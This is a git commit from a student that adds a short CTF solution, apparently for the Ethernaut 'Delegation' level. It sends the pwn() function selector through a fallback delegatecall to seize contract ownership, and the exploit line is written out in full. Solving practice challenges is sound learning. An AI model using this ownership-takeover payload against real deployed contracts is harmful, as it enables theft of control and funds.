ea77b4494cf183bca555353f01a40a745c007386
Nika Doghonadze <ndogh13@freeuni.edu.ge>
2021-12-01 23:10:39 +0400

    Solve task 6

---
+++ tasks/6.Delegate.js
@@ -0,0 +1,4 @@
+// https://emn178.github.io/online-tools/keccak_256.html
+// pwn()
+// 'dd365b8b15d5d78ec041b851b68c8b985bee78bee0b87c4acf261024d8beabab'
+contract.sendTransaction({data: 'dd365b8b'})
